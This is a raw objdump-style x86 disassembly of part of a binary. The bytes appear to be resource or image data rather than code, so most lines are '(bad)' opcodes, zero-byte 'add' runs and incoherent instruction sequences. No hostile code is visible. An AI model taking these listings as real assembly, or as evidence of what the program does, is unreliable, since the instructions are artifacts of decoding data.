  40e5b8:	add    BYTE PTR [eax+0x4c80],0x0
  40e5bf:	or     al,BYTE PTR [eax]
  40e5c1:	add    BYTE PTR [eax],al
  40e5c3:	add    eax,DWORD PTR [eax]
  40e5c5:	add    BYTE PTR [eax],al
  40e5c7:	add    edi,edi
  40e5c9:	(bad)  
  40e5ca:	inc    DWORD PTR [eax]
	...
  40e5fc:	(bad)  
  40e5fd:	(bad)  
  40e5fe:	inc    DWORD PTR [eax]
  40e600:	(bad)  
  40e601:	(bad)  
  40e602:	inc    DWORD PTR [eax]
  40e604:	(bad)  
  40e605:	(bad)  
  40e606:	inc    DWORD PTR [eax]
  40e608:	(bad)  
  40e609:	(bad)  
  40e60a:	inc    DWORD PTR [eax]
  40e60c:	(bad)  
  40e60d:	(bad)  
  40e60e:	inc    DWORD PTR [eax]
  40e610:	(bad)  
  40e611:	(bad)  
  40e612:	inc    DWORD PTR [eax]
  40e614:	(bad)  
  40e615:	(bad)  
  40e616:	inc    DWORD PTR [eax]
  40e618:	(bad)  
  40e619:	(bad)  
  40e61a:	inc    DWORD PTR [eax]
  40e61c:	(bad)  
  40e61d:	(bad)  
  40e61e:	inc    DWORD PTR [eax]
  40e620:	(bad)  
  40e621:	(bad)  
  40e622:	inc    DWORD PTR [eax]
  40e624:	(bad)  
  40e625:	(bad)  
  40e626:	inc    DWORD PTR [eax]
  40e628:	(bad)  
  40e629:	(bad)  
  40e62a:	inc    DWORD PTR [eax]
  40e62c:	add    BYTE PTR [eax],al
  40e62e:	add    BYTE PTR [ecx],al
  40e630:	add    BYTE PTR [eax],al
  40e632:	add    BYTE PTR [ecx],al
  40e634:	add    BYTE PTR [eax],al
  40e636:	add    BYTE PTR [ecx],al
  40e638:	add    BYTE PTR [eax],al
  40e63a:	add    BYTE PTR [ecx],al
  40e63c:	add    BYTE PTR [eax],al
  40e63e:	add    BYTE PTR [ecx],al
  40e640:	add    BYTE PTR [eax],al
  40e642:	add    BYTE PTR [ecx],al
  40e644:	xchg   esp,eax
  40e645:	xchg   esp,eax
  40e646:	xchg   esp,eax
  40e647:	inc    edx
  40e648:	mov    cl,BYTE PTR [edx-0x7474b876]
  40e64e:	mov    ebx,DWORD PTR [eax-0x6f]
  40e651:	xchg   ecx,eax
  40e652:	xchg   ecx,eax
  40e653:	xchg   DWORD PTR [ebp+0x5c8585],eax
  40e659:	add    BYTE PTR [eax],al
  40e65b:	or     al,0x0
  40e65d:	add    BYTE PTR [eax],al
  40e65f:	add    edi,edi
  40e661:	(bad)  
  40e662:	inc    DWORD PTR [eax]
  40e664:	nop
  40e665:	nop
  40e666:	nop
  40e667:	adc    DWORD PTR [eax],eax
  40e669:	add    BYTE PTR [eax],al
  40e66b:	add    al,BYTE PTR [eax]
  40e66d:	add    BYTE PTR [eax],al
  40e66f:	add    DWORD PTR [eax],eax
  40e671:	add    BYTE PTR [eax],al
  40e673:	add    DWORD PTR [eax],eax
  40e675:	add    BYTE PTR [eax],al
  40e677:	add    edi,edi
  40e679:	(bad)  
  40e67a:	inc    DWORD PTR [eax]
  40e67c:	(bad)  
  40e67d:	(bad)  
  40e67e:	inc    DWORD PTR [eax]
  40e680:	(bad)  
  40e681:	(bad)  
  40e682:	inc    DWORD PTR [eax]
	...
  40e6b0:	cld    
  40e6b1:	add    BYTE PTR [edi],cl
  40e6b3:	loopne 0x40e6b8
  40e6b5:	inc    DWORD PTR [eax]
  40e6b7:	add    al,dh
  40e6b9:	add    BYTE PTR [eax],al
  40e6bb:	add    BYTE PTR [eax],al
  40e6bd:	inc    DWORD PTR [eax]
  40e6bf:	add    al,ah
  40e6c1:	add    BYTE PTR [eax],al
  40e6c3:	add    BYTE PTR [eax],al
  40e6c5:	aas    
  40e6c6:	add    BYTE PTR [eax],al
  40e6c8:	rol    BYTE PTR [eax],0x0
  40e6cb:	add    BYTE PTR [eax],al
  40e6cd:	pop    ds
  40e6ce:	add    BYTE PTR [eax],al
  40e6d0:	rol    BYTE PTR [eax],0x0
  40e6d3:	add    BYTE PTR [eax],al
  40e6d5:	sldt   WORD PTR [eax]
  40e6d8:	rol    BYTE PTR [eax],0x0
  40e6db:	add    BYTE PTR [eax],al
  40e6dd:	pop    es
  40e6de:	add    BYTE PTR [eax],al
  40e6e0:	rol    BYTE PTR [eax],0x0
  40e6e3:	add    BYTE PTR [eax],al
  40e6e5:	add    eax,DWORD PTR [eax]
  40e6e7:	add    al,al
  40e6e9:	add    BYTE PTR [eax],al
  40e6eb:	add    BYTE PTR [eax],al
  40e6ed:	add    eax,DWORD PTR [eax]
  40e6ef:	add    al,al
  40e6f1:	add    BYTE PTR [eax],al
  40e6f3:	add    BYTE PTR [eax],al
  40e6f5:	add    DWORD PTR [eax],eax
  40e6f7:	add    al,al
  40e6f9:	add    BYTE PTR [eax],al
  40e6fb:	add    BYTE PTR [eax],al
  40e6fd:	add    DWORD PTR [eax],eax
  40e6ff:	add    al,al
  40e701:	add    BYTE PTR [eax],al
  40e703:	add    BYTE PTR [eax],al
  40e705:	add    BYTE PTR [eax],al
  40e707:	add    al,al
  40e709:	add    BYTE PTR [eax],al
  40e70b:	add    BYTE PTR [eax],al
  40e70d:	add    BYTE PTR [eax],al
  40e70f:	add    al,al
  40e711:	add    BYTE PTR [eax],al
  40e713:	add    BYTE PTR [eax],al
  40e715:	add    BYTE PTR [eax],al
  40e717:	add    al,al
  40e719:	add    BYTE PTR [eax],al
  40e71b:	add    BYTE PTR [eax],al
  40e71d:	add    BYTE PTR [eax],al
  40e71f:	add    al,al
  40e721:	add    BYTE PTR [eax],al
  40e723:	add    BYTE PTR [eax],al
  40e725:	add    BYTE PTR [eax],al
  40e727:	add    al,al
  40e729:	add    BYTE PTR [eax],al
  40e72b:	add    BYTE PTR [eax],al
  40e72d:	add    BYTE PTR [eax],al
  40e72f:	add    al,al
  40e731:	add    BYTE PTR [eax],al
  40e733:	add    BYTE PTR [eax],al
  40e735:	add    BYTE PTR [eax],al
  40e737:	add    al,al
  40e739:	add    BYTE PTR [eax],al
  40e73b:	add    BYTE PTR [eax],al
  40e73d:	add    BYTE PTR [eax],al
  40e73f:	add    al,al
  40e741:	add    BYTE PTR [eax],al
  40e743:	add    BYTE PTR [eax],al
  40e745:	add    BYTE PTR [eax],al
  40e747:	add    al,al
  40e749:	add    BYTE PTR [eax],al
  40e74b:	add    BYTE PTR [eax],al
  40e74d:	add    BYTE PTR [eax],al
  40e74f:	add    al,al
  40e751:	add    BYTE PTR [eax],al
  40e753:	add    BYTE PTR [eax],al
  40e755:	add    BYTE PTR [eax],al
  40e757:	add    al,al
  40e759:	add    BYTE PTR [eax],al
  40e75b:	add    BYTE PTR [eax],al
  40e75d:	add    BYTE PTR [eax],al
  40e75f:	add    al,al
  40e761:	add    BYTE PTR [eax],al
  40e763:	add    BYTE PTR [eax],al
  40e765:	add    BYTE PTR [eax],al
  40e767:	add    al,al
  40e769:	add    BYTE PTR [eax],al
  40e76b:	add    BYTE PTR [eax],al
  40e76d:	add    BYTE PTR [eax],al
  40e76f:	add    al,al
  40e771:	add    BYTE PTR [eax],al
  40e773:	add    BYTE PTR [eax],al
  40e775:	add    BYTE PTR [eax],al
  40e777:	add    al,al
  40e779:	add    BYTE PTR [eax],al
  40e77b:	add    BYTE PTR [eax],al
  40e77d:	add    DWORD PTR [eax],eax
  40e77f:	add    al,al
  40e781:	add    BYTE PTR [eax],al
  40e783:	add    BYTE PTR [eax],al
  40e785:	add    DWORD PTR [eax],eax
  40e787:	add    al,al
  40e789:	add    BYTE PTR [eax],al
  40e78b:	add    BYTE PTR [eax],al
  40e78d:	add    eax,DWORD PTR [eax]
  40e78f:	add    al,al
  40e791:	add    BYTE PTR [eax],al
  40e793:	add    BYTE PTR [eax],al
  40e795:	pop    es
  40e796:	add    BYTE PTR [eax],al
  40e798:	rol    BYTE PTR [eax],0x0
  40e79b:	add    BYTE PTR [eax],al
  40e79d:	pop    es
  40e79e:	add    BYTE PTR [eax],al
  40e7a0:	rol    BYTE PTR [eax],0x0
  40e7a3:	add    BYTE PTR [eax],al
  40e7a5:	pop    ds
  40e7a6:	add    BYTE PTR [eax],al
  40e7a8:	rol    BYTE PTR [eax],0x0
  40e7ab:	add    BYTE PTR [eax],al
  40e7ad:	aas    
  40e7ae:	add    BYTE PTR [eax],al
  40e7b0:	rol    BYTE PTR [eax],0x0
  40e7b3:	add    BYTE PTR [eax],al
  40e7b5:	jg     0x40e7b7
  40e7b7:	add    al,al
  40e7b9:	add    BYTE PTR [eax],al
  40e7bb:	add    BYTE PTR [eax],al
  40e7bd:	aas    
  40e7be:	add    BYTE PTR [eax],al
  40e7c0:	rol    BYTE PTR [eax],0x0
  40e7c3:	add    BYTE PTR [eax],al
  40e7c5:	aas    
  40e7c6:	add    BYTE PTR [eax],al
  40e7c8:	rol    BYTE PTR [eax],0x0
  40e7cb:	add    BYTE PTR [eax],al
  40e7cd:	aas    
  40e7ce:	add    BYTE PTR [eax],al
  40e7d0:	rol    BYTE PTR [eax],0x0
  40e7d3:	add    BYTE PTR [eax],al
  40e7d5:	inc    DWORD PTR [eax]
  40e7d7:	add    BYTE PTR [eax+0x1000000],al
  40e7dd:	inc    DWORD PTR [eax]
  40e7df:	add    BYTE PTR [eax+0x3000000],al
  40e7e5:	inc    DWORD PTR [eax]
  40e7e7:	add    BYTE PTR [eax+0x3000000],al
  40e7ed:	inc    DWORD PTR [eax]
  40e7ef:	add    BYTE PTR [eax],al
  40e7f1:	add    BYTE PTR [eax],al
  40e7f3:	add    BYTE PTR [ecx],al
  40e7f5:	inc    DWORD PTR [eax]
  40e7f7:	add    BYTE PTR [eax],al
  40e7f9:	add    BYTE PTR [eax],al
  40e7fb:	add    BYTE PTR [ecx],al
  40e7fd:	inc    DWORD PTR [eax]
  40e7ff:	add    BYTE PTR [eax],al
  40e801:	add    BYTE PTR [eax],al
  40e803:	add    BYTE PTR [eax],al
  40e805:	inc    DWORD PTR [eax]
  40e807:	add    BYTE PTR [eax],al
  40e809:	add    BYTE PTR [eax],al
  40e80b:	add    BYTE PTR [eax],al
  40e80d:	inc    DWORD PTR [eax]
  40e80f:	add    BYTE PTR [eax],al
  40e811:	add    BYTE PTR [eax],al
  40e813:	add    BYTE PTR [eax],al
  40e815:	inc    DWORD PTR [eax]
  40e817:	add    al,al
  40e819:	add    BYTE PTR [eax],al
  40e81b:	add    BYTE PTR [eax],al
  40e81d:	inc    DWORD PTR [eax]
  40e81f:	add    al,dh
  40e821:	add    BYTE PTR [eax],al
  40e823:	add    BYTE PTR [ebx],al
  40e825:	inc    DWORD PTR [eax]
  40e827:	add    bh,bh
  40e829:	inc    BYTE PTR [eax]
  40e82b:	or     BYTE PTR [edi],bh
  40e82d:	inc    DWORD PTR [eax]
  40e82f:	add    BYTE PTR [eax],ch
  40e831:	add    BYTE PTR [eax],al
  40e833:	add    BYTE PTR [eax],ah
  40e835:	add    BYTE PTR [eax],al
  40e837:	add    BYTE PTR [eax+0x0],al
  40e83a:	add    BYTE PTR [eax],al
  40e83c:	add    DWORD PTR [eax],eax
  40e83e:	and    BYTE PTR [eax],al
	...
  40e864:	add    BYTE PTR [eax],al
  40e866:	add    BYTE PTR ds:0x1e000000,al
  40e86c:	add    BYTE PTR [eax],al
  40e86e:	add    BYTE PTR [esi+0x0],cl
  40e871:	add    BYTE PTR [eax],al
  40e873:	jae    0x40e875
  40e875:	add    BYTE PTR [eax],al
  40e877:	outs   dx,BYTE PTR ds:[esi]
  40e878:	add    BYTE PTR [eax],al
  40e87a:	add    BYTE PTR [eax+0x0],bl
  40e87d:	add    BYTE PTR [eax],al
  40e87f:	inc    esp
  40e880:	add    BYTE PTR [eax],al
  40e882:	add    BYTE PTR [ecx],dh
  40e884:	add    BYTE PTR [eax],al
  40e886:	add    BYTE PTR [edx],ah
  40e888:	add    BYTE PTR [eax],al
  40e88a:	add    BYTE PTR [edi],dl
  40e88c:	add    BYTE PTR [eax],al
  40e88e:	add    BYTE PTR [esi],cl
  40e890:	add    BYTE PTR [eax],al
  40e892:	add    BYTE PTR [esi],al
  40e894:	add    BYTE PTR [eax],al
  40e896:	add    BYTE PTR [ecx],al
  40e898:	add    BYTE PTR [eax],al
  40e89a:	add    BYTE PTR [ebx],al
  40e89c:	add    BYTE PTR [eax],al
  40e89e:	add    BYTE PTR [eax+eax*1],cl
  40e8a1:	add    BYTE PTR [eax],al
  40e8a3:	sbb    al,0x0
  40e8a5:	add    BYTE PTR [eax],al
  40e8a7:	add    BYTE PTR cs:[eax],al
  40e8aa:	add    BYTE PTR [eax+eax*1],bh
  40e8ad:	add    BYTE PTR [eax],al
  40e8af:	inc    eax
  40e8b0:	add    BYTE PTR [eax],al
  40e8b2:	add    BYTE PTR ds:0x30000000,bh
  40e8b8:	add    BYTE PTR [eax],al
  40e8ba:	add    BYTE PTR [edi],bl
  40e8bc:	add    BYTE PTR [eax],al
  40e8be:	add    BYTE PTR [edi],cl
  40e8c0:	add    BYTE PTR [eax],al
  40e8c2:	add    BYTE PTR [eax+eax*1],al
	...
  40e8dd:	add    BYTE PTR [eax],al
  40e8df:	add    DWORD PTR [eax],eax
  40e8e1:	add    BYTE PTR [eax],al
  40e8e3:	or     BYTE PTR [eax],al
  40e8e5:	add    BYTE PTR [eax],al
  40e8e7:	cmp    edi,DWORD PTR es:[ebx]
  40e8ea:	cmp    ebx,DWORD PTR [ecx-0x1289898a]
  40e8f0:	pop    ebp
  40e8f1:	pop    ebp
  40e8f2:	pop    ebp
  40e8f3:	in     al,0x35
  40e8f5:	xor    eax,0x1f1fd035
  40e8fa:	pop    ds
  40e8fb:	mov    ebp,0xa7101010
  40e900:	add    BYTE PTR [eax],al
  40e902:	add    BYTE PTR [eax+eax*1+0x790000],cl
  40e909:	add    BYTE PTR [eax],al
  40e90b:	add    BYTE PTR fs:[eax],al
  40e90e:	add    BYTE PTR [eax+eax*1+0x0],cl
  40e912:	add    BYTE PTR ds:0x25000000,dh
  40e918:	add    BYTE PTR [eax],al
  40e91a:	add    BYTE PTR [esi],ah
  40e91c:	add    BYTE PTR [eax],al
  40e91e:	add    BYTE PTR [ebx+0x1e],al
  40e921:	adc    al,0x14
  40e923:	jnp    0x40e955
  40e925:	and    BYTE PTR [eax],ah
  40e927:	mov    ds:0xaf1f1f2f,al
  40e92c:	cs push ds
  40e92e:	push   ds
  40e92f:	mov    cl,0x1b
  40e931:	adc    DWORD PTR [ecx],edx
  40e933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e934:	add    BYTE PTR [eax],al
  40e936:	add    BYTE PTR [eax+eax*1+0x730000],cl
  40e93d:	add    BYTE PTR [eax],al
  40e93f:	dec    esp
  40e940:	add    BYTE PTR [eax],al
  40e942:	add    BYTE PTR [edx],ah
  40e944:	add    BYTE PTR [eax],al
  40e946:	add    BYTE PTR [edx],cl
  40e948:	add    BYTE PTR [eax],al
  40e94a:	add    BYTE PTR [ecx],al
	...
  40e958:	(bad)  
  40e959:	(bad)  
  40e95a:	inc    DWORD PTR [eax]
  40e95c:	add    BYTE PTR [eax],al
  40e95e:	add    BYTE PTR ds:0x26000000,al
  40e964:	dec    esp
  40e965:	dec    esp
  40e966:	dec    esp
  40e967:	mov    dh,0xa3
  40e969:	mov    ds:0xecedffa3,eax
  40e96e:	jmp    0x40e96f
  40e970:	hlt    
  40e971:	hlt    
  40e972:	repnz (bad) 
  40e974:	fstp   st(5)
  40e976:	fdiv   st(7),st
  40e978:	ret    
  40e979:	ret    0xffc0
  40e97c:	xchg   ecx,eax
  40e97d:	nop
  40e97e:	(bad)  
  40e97f:	mul    DWORD PTR [esi+0x66]
  40e982:	in     ax,dx
  40e984:	inc    ebx
  40e985:	inc    esp
  40e986:	inc    esp
  40e987:	(bad)  [edx]
  40e989:	sub    ch,BYTE PTR [ebx]
  40e98b:	(bad)  
  40e98c:	push   cs
  40e98d:	push   cs
  40e98e:	push   cs
  40e98f:	lods   al,BYTE PTR ds:[esi]
  40e990:	add    al,BYTE PTR [edx]
  40e992:	add    dl,BYTE PTR [edi-0x7c000000]
  40e998:	and    esp,DWORD PTR ss:[ebx]
  40e99b:	fwait
  40e99c:	ja     0x40e9ee
  40e99e:	push   eax
  40e99f:	fstp   QWORD PTR [edi-0x3b0b8e8f]
  40e9a5:	xchg   esi,eax
  40e9a6:	xchg   esi,eax
  40e9a7:	std    
  40e9a8:	shl    DWORD PTR [esi-0x5f39015a],1
  40e9ae:	mov    al,ds:0x7b7ba0fe
  40e9b3:	idiv   DWORD PTR [ecx+0x52]
  40e9b6:	push   edx
  40e9b7:	in     al,dx
  40e9b8:	cmp    eax,0xca2828
  40e9bd:	add    BYTE PTR [eax],al
  40e9bf:	popf   
  40e9c0:	add    BYTE PTR [eax],al
  40e9c2:	add    BYTE PTR [eax+0x0],dh
  40e9c5:	add    BYTE PTR [eax],al
  40e9c7:	add    BYTE PTR ss:[eax],al
  40e9ca:	add    BYTE PTR [esi],cl
  40e9cc:	add    BYTE PTR [eax],al
  40e9ce:	add    BYTE PTR [ecx],al
	...
  40e9d8:	(bad)  
  40e9d9:	(bad)  
  40e9da:	inc    DWORD PTR [eax]
  40e9dc:	inc    edx
  40e9dd:	inc    edx
  40e9de:	inc    edx
  40e9df:	push   ds
  40e9e0:	outs   dx,DWORD PTR ds:[esi]
  40e9e1:	outs   dx,DWORD PTR ds:[esi]
  40e9e2:	outs   dx,DWORD PTR ds:[esi]
  40e9e3:	lds    edi,FWORD PTR [esi-0x2b004142]
  40e9e9:	aam    0xd4
  40e9eb:	(bad)  
  40e9ec:	jmp    0x40e9d6
  40e9ee:	in     eax,0xff
  40e9f0:	(bad)  
  40e9f1:	(bad)  
  40e9f2:	stc    
  40e9f3:	(bad)  
  40e9f4:	(bad)  
  40e9f5:	(bad)  
  40e9f6:	sti    
  40e9f7:	(bad)  
  40e9f8:	(bad)  
  40e9f9:	(bad)  
  40e9fa:	sti    
  40e9fb:	(bad)  
  40e9fc:	(bad)  
  40e9fd:	std    
  40e9fe:	clc    
  40e9ff:	(bad)  
  40ea00:	(bad)  
  40ea01:	sti    
  40ea02:	idiv   bh
  40ea04:	in     eax,dx
  40ea05:	call   0xb80ce9ee
  40ea0a:	mov    ds:0x7f94a7ff,eax
  40ea0f:	(bad)  
  40ea10:	jp     0x40ea82
  40ea12:	gs repz popa 
  40ea15:	dec    edx
  40ea16:	dec    edx
  40ea17:	call   0xfdbc65d2
  40ea1c:	out    dx,al
  40ea1d:	lods   al,BYTE PTR ds:[esi]
  40ea1e:	lods   al,BYTE PTR ds:[esi]
  40ea1f:	(bad)  
  40ea20:	inc    esi
  40ea22:	(bad)  
  40ea23:	(bad)  
  40ea24:	dec    edi
  40ea26:	iret   
  40ea27:	(bad)  
  40ea28:	(bad)  
  40ea29:	fcmovu st,st(2)
  40ea2b:	(bad)  
  40ea2c:	jmp    ecx
  40ea2e:	loope  0x40ea2f
  40ea30:	(bad)  
  40ea31:	jmp    0xe033ea1f
  40ea36:	(bad)  
  40ea38:	enter  0xa9a9,0xff
  40ea3c:	jbe    0x40ea8e
  40ea3e:	push   eax
  40ea3f:	jmp    0x40ea5a
  40ea41:	adc    BYTE PTR [eax],dl
  40ea43:	mov    dh,0x0
  40ea45:	add    BYTE PTR [eax],al
  40ea47:	jg     0x40ea49
  40ea49:	add    BYTE PTR [eax],al
  40ea4b:	cmp    al,0x0
  40ea4d:	add    BYTE PTR [eax],al
  40ea4f:	or     eax,0x1000000
  40ea54:	add    BYTE PTR [eax],al
  40ea56:	add    BYTE PTR [eax],al
  40ea58:	(bad)  
  40ea59:	(bad)  
  40ea5a:	inc    DWORD PTR [eax]
  40ea5c:	arpl   WORD PTR [ebx+0x63],sp
  40ea5f:	pop    edi
  40ea60:	mov    esi,0xc1ffbebe
  40ea65:	rol    ecx,0xff
  40ea68:	mov    bh,0xb7
  40ea6a:	mov    bh,0xff
  40ea6c:	jmp    0x40ea55
  40ea6e:	loope  0x40ea6f
  40ea70:	(bad)  
  40ea71:	clc    
  40ea72:	out    dx,al
  40ea73:	(bad)  
  40ea74:	(bad)  
  40ea75:	imul   ah
  40ea77:	(bad)  
  40ea78:	std    
  40ea79:	imul   bl
  40ea7b:	(bad)  
  40ea7c:	(bad)  
  40ea7d:	stc    
  40ea7e:	idiv   bh
  40ea80:	(bad)  
  40ea81:	cld    
  40ea82:	cld    
  40ea83:	(bad)  
  40ea84:	push   eax
  40ea86:	loope  0x40ea87
  40ea88:	call   eax
  40ea8a:	lahf   
  40ea8b:	(bad)  
  40ea8c:	call   ebx
  40ea8e:	pushf  
  40ea8f:	inc    esp
  40ea91:	xchg   ecx,eax
  40ea92:	jnp    0x40ea93
  40ea94:	rol    DWORD PTR [ebp+eax*4-0x54540001],1
  40ea9b:	(bad)  
  40ea9c:	push   DWORD PTR [ebp-0x4500004b]
  40eaa2:	mov    edx,0xc3c3ffff
  40eaa7:	(bad)  
  40eaa8:	dec    esp
  40eaaa:	int3   
  40eaab:	(bad)  
  40eaac:	call   ebp
  40eaae:	aad    0xff
  40eab0:	(bad)  
  40eab1:	fstp   st(5)
  40eab3:	(bad)  
  40eab4:	jmp    edi
  40eab6:	out    0xff,eax
  40eab8:	(bad)  
  40eab9:	(bad)  
  40eaba:	(bad)  
  40eabb:	(bad)  
  40eabc:	jmp    0x40eaa0
  40eabe:	loop   0x40eabf
  40eac0:	xchg   ebx,eax
  40eac1:	ins    DWORD PTR es:[edi],dx
  40eac2:	ins    DWORD PTR es:[edi],dx
  40eac3:	neg    BYTE PTR ds:0xbb1313
  40eac9:	add    BYTE PTR [eax],al
  40eacb:	jle    0x40eacd
  40eacd:	add    BYTE PTR [eax],al
  40eacf:	xor    eax,DWORD PTR [eax]
  40ead1:	add    BYTE PTR [eax],al
  40ead3:	or     BYTE PTR [eax],al
  40ead5:	add    BYTE PTR [eax],al
  40ead7:	add    bh,bh
  40ead9:	(bad)  
  40eada:	inc    DWORD PTR [eax]
  40eadc:	imul   ebp,DWORD PTR [ecx+0x69],0xb7b7b763
  40eae3:	push   DWORD PTR [esi-0x3e00494a]
  40eae9:	ret    0xffc2
  40eaec:	jmp    0x40ead2
  40eaee:	(bad)  
  40eaf0:	push   esi
  40eaf2:	out    dx,al
  40eaf3:	dec    esi
  40eaf5:	loop   0x40eab1
  40eaf7:	(bad)  
  40eaf8:	cmp    al,0xac
  40eafa:	xor    eax,0x78c780ff
  40eaff:	push   DWORD PTR [eax-0x2e005a27]
  40eb05:	into   
  40eb06:	xchg   edi,eax
  40eb07:	(bad)  
  40eb08:	out    dx,eax
  40eb09:	(bad)  
  40eb0a:	(bad)  
  40eb0b:	call   ebx
  40eb0d:	sahf   
  40eb0e:	cmp    bh,0xc7
  40eb11:	jl     0x40eb91
  40eb13:	(bad)  
  40eb14:	call   FWORD PTR [ebp+ebx*4-0x5e5e0001]
  40eb1b:	(bad)  
  40eb1c:	jmp    FWORD PTR [edx-0x4d000056]
  40eb22:	mov    dl,0xff
  40eb24:	(bad)  
  40eb25:	mov    edx,0xc4ffffba
  40eb2a:	(bad)  
  40eb2b:	(bad)  
  40eb2c:	dec    esp
  40eb2e:	int3   
  40eb2f:	(bad)  
  40eb30:	call   esp
  40eb32:	aam    0xff
  40eb34:	jmp    ebx
  40eb36:	jecxz  0x40eb37
  40eb38:	(bad)  
  40eb39:	(bad)  
  40eb3a:	(bad)  
  40eb3b:	(bad)  
  40eb3c:	(bad)  
  40eb3d:	(bad)  
  40eb3e:	(bad)  
  40eb3f:	push   ecx
  40eb41:	jmp    0xf569:0x6991ffea
  40eb48:	adc    DWORD PTR [ebx],ecx
  40eb4a:	or     esi,DWORD PTR [ecx+0x6b000000]
  40eb50:	add    BYTE PTR [eax],al
  40eb52:	add    BYTE PTR [edi],bl
  40eb54:	add    BYTE PTR [eax],al
  40eb56:	add    BYTE PTR [ebx],al
  40eb58:	(bad)  
  40eb59:	(bad)  
  40eb5a:	inc    DWORD PTR [eax]
  40eb5c:	push   0x6a
  40eb5e:	push   0x62
  40eb60:	mov    ebx,0xb1ffbbbb
  40eb65:	mov    cl,0xb1
  40eb67:	(bad)  
  40eb68:	mov    edi,0xedffc0c0
  40eb6d:	in     al,0xdb
  40eb6f:	(bad)  
  40eb70:	push   ebx
  40eb72:	call   0xb11fb276
  40eb77:	inc    DWORD PTR [eax]
  40eb79:	popf   
  40eb7a:	add    bh,bh
  40eb7c:	add    BYTE PTR [eax-0x5efe00fd],ah
  40eb82:	or     bh,bh
  40eb84:	setl   BYTE PTR [ecx]
  40eb87:	jmp    FWORD PTR [edi]
  40eb89:	call   0xff75:0x7ab0ff1d
  40eb90:	cld    
  40eb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb92:	test   al,0xff
  40eb94:	call   FWORD PTR [edi-0x66000061]
  40eb9a:	cdq    
  40eb9b:	(bad)  
  40eb9c:	jmp    DWORD PTR [eax-0x55000060]
  40eba2:	stos   BYTE PTR es:[edi],al
  40eba3:	(bad)  
  40eba4:	push   DWORD PTR [ebx-0x4500004d]
  40ebaa:	mov    ecx,0xc3c4ffff
  40ebaf:	(bad)  
  40ebb0:	dec    ebx
  40ebb2:	retf   
  40ebb3:	(bad)  
  40ebb4:	(bad)  
  40ebb5:	jmp    0xffff:0xffffffea
  40ebbc:	(bad)  
  40ebbd:	(bad)  
  40ebbe:	(bad)  
  40ebbf:	(bad)  
  40ebc0:	(bad)  
  40ebc1:	(bad)  
  40ebc2:	(bad)  
  40ebc3:	jmp    ebp
  40ebc5:	fcomp  st(0)
  40ebc7:	jmp    FWORD PTR [edi+0x4a]
  40ebca:	dec    edx
  40ebcb:	call   0x9840ebd0
  40ebd0:	add    BYTE PTR [eax],al
  40ebd2:	add    BYTE PTR [esi+0x0],al
  40ebd5:	add    BYTE PTR [eax],al
  40ebd7:	or     eax,0xffffff
  40ebdc:	imul   ebp,DWORD PTR [ebx+0x6b],0x62
  40ebe0:	mov    edi,0xd8ffbfbf
  40ebe5:	fcomp  st(0)
  40ebe7:	(bad)  
  40ebe8:	(bad)  
  40ebea:	(bad)  
  40ebec:	jmp    0x40c4d1
  40ebf1:	out    dx,al
  40ebf2:	(bad)  
  40ebf4:	retf   
  40ebf5:	fidiv  WORD PTR [eax+0x1bb00aff]
  40ebfb:	call   FWORD PTR [ebx]
  40ebfd:	mov    ah,0x29
  40ebff:	call   DWORD PTR [ebx]
  40ec01:	lods   eax,DWORD PTR ds:[esi]
  40ec02:	push   ds
  40ec03:	inc    DWORD PTR [eax]
  40ec05:	pushf  
  40ec06:	add    bh,bh
  40ec08:	inc    ecx
  40ec09:	jl     0x40ec37
  40ec0b:	jmp    eax
  40ec0d:	call   0xffb5:0xb5ffff9f
  40ec14:	jmp    DWORD PTR [edi-0x61000059]
  40ec1a:	sahf   
  40ec1b:	(bad)  
  40ec1c:	call   FWORD PTR [ecx-0x5f000067]
  40ec22:	mov    al,ds:0xa5a7ffff
  40ec27:	(bad)  
  40ec28:	push   DWORD PTR [ecx-0x46000050]
  40ec2e:	mov    ecx,0xc3c5ffff
  40ec33:	(bad)  
  40ec34:	(bad)  
  40ec35:	stc    
  40ec36:	stc    
  40ec37:	(bad)  
  40ec38:	(bad)  
  40ec39:	(bad)  
  40ec3a:	(bad)  
  40ec3b:	(bad)  
  40ec3c:	(bad)  
  40ec3d:	(bad)  
  40ec3e:	(bad)  
  40ec3f:	(bad)  
  40ec40:	(bad)  
  40ec41:	(bad)  
  40ec42:	(bad)  
  40ec43:	(bad)  
  40ec44:	(bad)  
  40ec45:	(bad)  
  40ec46:	(bad)  
  40ec47:	(bad)  
  40ec48:	mov    esi,0x33fe9f9f
  40ec4d:	and    DWORD PTR [ecx],esp
  40ec4f:	ret    
  40ec50:	add    BYTE PTR [eax],al
  40ec52:	add    BYTE PTR [ebp+0x0],ch
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	sbb    al,0xff
  40ec59:	(bad)  
  40ec5a:	inc    DWORD PTR [eax]
  40ec5c:	imul   ebp,DWORD PTR [ebx+0x6b],0x62
  40ec60:	retf   0xcaca
  40ec63:	jmp    ecx
  40ec65:	loope  0x40ec48
  40ec67:	(bad)  
  40ec68:	fcmovu st,st(3)
  40ec6a:	fdiv   st(7),st
  40ec6c:	call   0x40c350
  40ec71:	jmp    0xffaf:0xdfceffd7
  40ec78:	sbb    BYTE PTR [ebp-0x3dd600cf],bh
  40ec7e:	cmp    eax,0x27b419ff
  40ec83:	inc    DWORD PTR [eax]
  40ec85:	cwde   
  40ec86:	add    bh,bh
  40ec88:	jnp    0x40ed05
  40ec8a:	push   ebp
  40ec8b:	(bad)  
  40ec8c:	(bad)  
  40ec8d:	mov    ebp,0xb9ffffc4
  40ec92:	mov    ecx,0xb0b0ffff
  40ec97:	(bad)  
  40ec98:	jmp    DWORD PTR [edi-0x62000059]
  40ec9e:	popf   
  40ec9f:	(bad)  
  40eca0:	call   FWORD PTR [ebx-0x3e000066]
  40eca6:	sar    edi,1
  40eca8:	dec    ebx
  40ecaa:	hlt    
  40ecab:	(bad)  
  40ecac:	dec    esi
  40ecae:	cmc    
  40ecaf:	(bad)  
  40ecb0:	(bad)  
  40ecb1:	(bad)  
  40ecb3:	(bad)  
  40ecb4:	(bad)  
  40ecb5:	(bad)  
  40ecb6:	(bad)  
  40ecb7:	(bad)  
  40ecb8:	(bad)  
  40ecb9:	(bad)  
  40ecba:	(bad)  
  40ecbb:	(bad)  
  40ecbc:	(bad)  
  40ecbd:	(bad)  
  40ecbe:	(bad)  
  40ecbf:	(bad)  
  40ecc0:	(bad)  
  40ecc1:	(bad)  
  40ecc2:	(bad)  
  40ecc3:	(bad)  
  40ecc4:	(bad)  
  40ecc5:	(bad)  
  40ecc6:	(bad)  
